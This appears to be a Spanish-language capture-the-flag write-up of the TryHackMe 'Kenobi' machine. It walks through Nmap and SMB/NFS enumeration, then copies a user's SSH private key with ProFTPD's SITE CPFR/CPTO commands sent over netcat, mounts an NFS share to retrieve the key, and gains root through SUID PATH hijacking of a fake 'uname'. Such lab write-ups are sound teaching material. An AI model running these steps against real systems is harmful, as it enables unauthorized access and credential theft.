---
title: Kenobi - TryHackMe
categories: [FTP, File Transfer Protocol, SMB, Server Message Block, rpcbind, RPC, Remote Procedure Call, Samba, SMBMap, smbclient, Null Session, RSA, SSH, NFS, Network File System, Montura, SUID]
published: true
lang: es
---

Hoy vamos a resolver la máquina _Kenobi_ de _TryHackMe_. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/1.png)

### [](#header-3)Fase De Reconocimiento

Primeramente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo.

Para determinar que puertos están abiertos podemos realizar lo siguiente:
  
```bash
nmap -p- --open -T5 -v -n <dirección IP>
```
 
Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:
  
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <dirección IP>
```

A continuación se explican los parámetros utilizados en el escaneo de puertos con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-p\- | Escanea todo el rango de puertos (65535 en total) |
| \-\-open | Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) |
| \-T5 | La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, "generaremos más ruido", pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos `White Hat` | 
| \-v | _Verbose_, reporta lo encontrado por consola |
| \-n | No aplicar _resolución DNS_ |
| \-sS | Escaneo _TCP SYN_ |
| \-min-rate | Emitir paquetes no más lentos que \<valor\> por segundo |
| \-vvv | Triple _verbose_, para obtener mayor información por consola |
| \-Pn | No aplicar _host discovery_ |

```bash 
nmap -sC -sV -p 21,22,80,111,139,445,2049,35049,41843,47869,50933 <dirección IP>
```
  
A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-sC | Scripts básicos de enumeración |
| \-sV | Versión y servicios que corren bajo los puertos encontrados |
| \-p | Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) |

Con estos dos escaneos bastaría para responder a dos de las preguntas planteadas:

* ¿Cuántos puertos abiertos existen?
* ¿En qué puerto está corriendo el protocolo FTP?
* ¿Cuál es la versión del servicio ProFTPD que se está corriendo?

Para responder a estas dos últimas preguntas solo tenemos que revisar el escaneo de versiones y servicios que realizamos con _Nmap_; por otra parte, la primera pregunta tiene algo de trampa, ya que la respuesta correcta es `7` puertos abiertos, mientras que con nuestro escaneo detectamos `11`, ¿qué hicimos mal?

Nada, lo que sucede es que nosotros al indicar el parámetro `-p-`, estamos escaneando todo el rango de puertos, si no indicáramos este parámetro, _Nmap_ escanearía únicamente los `1000` puertos más comunes, por lo que vemos que _TryHackMe_ no se dio la molestia de escanearlo todo por completo.

Habiendo aclarado esto, los puertos abiertos más relevantes que encontramos son el `139` y el `445`, ambos relacionados con el protocolo `SMB` (Server Message Block), el puerto `111` relacionado con el servicio `rpcbind`, relacionado a su vez con `RPC` (Remote Procedure Call), y el puerto `21` relacionado con el protocolo `FTP` (File Transfer Protocol).

En este punto, _TryHackMe_ nos sugiere usar el propio _Nmap_ para enumerar los recursos compartidos a través de `Samba`, que si bien podemos hacerlo, optaremos por usar `SMBMap` y `smbclient`.

### [](#header-3)SMBMap

Para poder listar los recursos compartidos haciendo uso de `SMBMap`, bastará con indicar la direción IP de la máquina víctima.

```bash
smbmap -H <dirección IP>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/2.png)

Lo primero que podemos darnos cuenta es que existen `3` recursos compartidos, de los cuales solo tenemos acceso a uno, `anonymous`.

Si decidimos listar de manera recursiva el recurso `anonymous`, encontraremos un archivo que lleva por nombre `log.txt`, el cual ya levanta nuestras sospechas.

```bash
smbmap -H <dirección IP> -R anonymous
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/3.png)

Para poder descargar el archivo `log.txt`, podremos hacerlo usando tanto su ruta absoluta con el parámetro `--download`, o bien creando patrones mediante _expresiones regulares_ con el parámetro `-A`.

```bash
smbmap -H <dirección IP> --download anonymous/log.txt
```

```bash
smbmap -H <dirección IP> -R anonymous -A log.txt
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/4.png)

### [](#header-3)smbclient

Para poder listar los recursos compartidos haciendo uso de `smbclient` tendremos que especificar el parámetro `-L`, adicional a ello tendremos que indicar que queremos hacer uso de un `null session` con el parámetro `-N`, ya que no conocemos credenciales con las cuales autenticarnos; esto con `SMBMap` no ocurría ya que por defecto hace uso de un `null session`, a no ser que le indiquemos un usuario y contraseña.

```bash
smbclient -N -L <dirección IP>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/5.png)

En este caso, no se nos indica los permisos que tenemos sobre los recursos, no obstante, podemos intuir a que recursos tenemos acceso, por ejemplo, el recurso [print$](https://wiki.samba.org/index.php/Setting_up_Automatic_Printer_Driver_Downloads_for_Windows_Clients#Setting_up_the_.5Bprint.24.5D_Share) se relaciona con impresoras que se están compartiendo a nivel de red, por otra parte, tenemos el recurso [IPC$](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session) el cual crea el propio _Windows_ para poder hacer uso de los _null sessions_; de modo que, de los `3` recursos compartidos existentes, solo nos queda `anonymous`.

Lo siguiente que haremos será listar el contenido que se encuentra dentro del recurso `anonymous`.

```bash
smbclient -N //dirección IP/anonymous
ls
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/6.png)

Podemos observar que dentro existe un archivo llamado `log.txt`, el cual procederemos a descargar.

```bash
smbclient -N //dirección IP/anonymous
get log.txt
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/7.png)

Independientemente de como hayamos descargado el archivo `log.txt`, al leerlo, lo más importante que encontraremos será la ubicación del par de claves `RSA`, ubicadas en `/home/kenobi/.ssh`.

Adicionalmente, encontraremos información tanto del servicio `ProFTPD`, como del `Samba`, pero nada realmente interesante, por lo que estamos omitiendo algo.

Si recordamos, el puerto `111`, relacionado con `rpcbind`, estaba abierto, y lo que nos mostraba nuestro escaneo de versiones y servicios con _Nmap_, es que en este puerto está corriendo a su vez el protocolo `NFS` (Network File System) en el puerto `2049`.

El protocolo `NFS` se utiliza principalmente para acceder a archivos compartidos a nivel de red, de manera local. Comprobemos si se está compartiendo algún recurso que podamos _montar_ en nuestro equipo.

```bash
sudo showmount -e <dirección IP>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/8.png)

La ruta `/var` está siendo compartida a nivel de red, de modo que si lográramos mover algún archivo potencial dentro de esta ruta, y luego la montásemos en nuestro equipo, podríamos visualizar dicho archivo de manera local.

### [](#header-3)Fase De Explotación

Lo primero que podemos pensar es buscar alguna vulnerabilidad en el servicio `ProFTPD`, basado en `FTP` (File Transfer Protocol), moviendo así archivos desde el lado del cliente, hacia el servidor.

Para explotar el servicio `ProFTPD`, empezaremos buscando algún exploit que se encuentre en _Exploit Database_, para ello utilizaremos _SearchSploit_ para poder seguir trabajando desde nuestra terminal.

```
searchsploit ProFTPD 1.3.5
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/9.png)

De los `4` exploits que encontramos, nos quedaremos con el último

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/10.png)

Concretamente con las líneas 12, 13 y 14.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/11.png)

Las cuales nos permiten hacer justamente lo que nos interesa, copiar un archivo de una ruta (_CPFR_), a otra (_CPTO_).

De este modo, si nos conectamos a la máquina víctima a través del puerto `21`, podremos ejecutar estos comandos.

```bash
nc <direción IP> 21
```

```bash
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/12.png)

Ya con todo esto, podemos _montar_ la ruta `/var` en nuestro equipo, para ello haremos lo siguiente:

```bash
sudo mount <dirección IP>:/var /mnt/kenobiNFS
```

En caso de que tengamos un error similar a este:

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/13.png)

Simplemente tendremos que instalar lo siguiente:

```bash
sudo apt install nfs-common
```

Y ya que estamos, podemos también instalar la utilidad para montar archivo de tipo `CIFS`, que puede resultarnos de utilidad en algún momento.

```bash
sudo apt install cifs-utils
```

Una vez tenemos montada la ruta `/var` en nuestro equipo, procederemos a copiarnos el archivo `id_rsa` que movimos con anterioridad haciendo uso de `ProFTPD`.

Finalmente, podemos conectarnos a la máquina víctima a través de `SSH` sin proporcionar contraseña, ya que tenemos en nuestro poder la _clave privada_ del usuario `Kenobi`, no obstante, antes de hacerlo, vamos a asignar los permisos correspondientes al archivo `id_rsa`.

```bash
sudo chmod 600 id_rsa
```

```bash
ssh -i id_rsa kenobi@<dirección IP>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/14.png)

### [](#header-3)Escalada De Privilegios

Para realizar esta última fase, la misma plataforma de _TryHackMe_ nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos `SUID`. 

Para listar todos aquellos binarios con permisos `SUID` asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

```bash
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/15.png)

La forma más sencilla para abusar de algún binario con permisos mal asignados sería recurrir a [GTFOBins](https://gtfobins.github.io/), sin embargo, el binario que llama nuestra atención no es propio del sistema, por lo que `GTFOBins`, no nos será de utilidad.

Si comprobamos en nuestra máquina de atacantes, no existe ningún binario `/usr/bin/menu`, por lo que este debe haber sido creado, de modo que puede tener alguna falla de seguridad, vamos a revisarlo.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/16.png)

Vemos que el binario es lo que dice ser, un menú que nos presenta tres únicas posibilidades, vamos a echar un vistazo más a fondo.

```bash
strings /usr/bin/menu
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/17.png)

Podemos observar los binarios que utiliza este menú dependiendo de la opción que seleccionemos, lo más interesante aquí es que no se está empleando la ruta completa de estos comandos, tan solo se los está mencionando, por lo que, al no hacer esta verificación, podemos suplantarlos.

Antes de que el binario `/usr/bin/menu` encuentre los binarios legítimos dentro de la variable de entorno `PATH`, nosotros añadiremos nuestros propios binarios en el inicio, los cuales serán igual en nombre, pero ejecutarán el código que nos interese, en este caso una consola con máximos privilegios.

Este proceso podemos realizarlo para cualquiera de los tres binarios, _curl_, _uname_ o _ifconfig_, eso si, debemos de encontrarnos en una ruta donde tengamos permisos de escritura, el directorio del usuario `Kenobi`, o la ruta `/tmp` por ejemplo.

```bash
echo '/bin/sh' > uname
export PATH=/home/kenobi:$PATH
chmod +x uname
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/18.png)
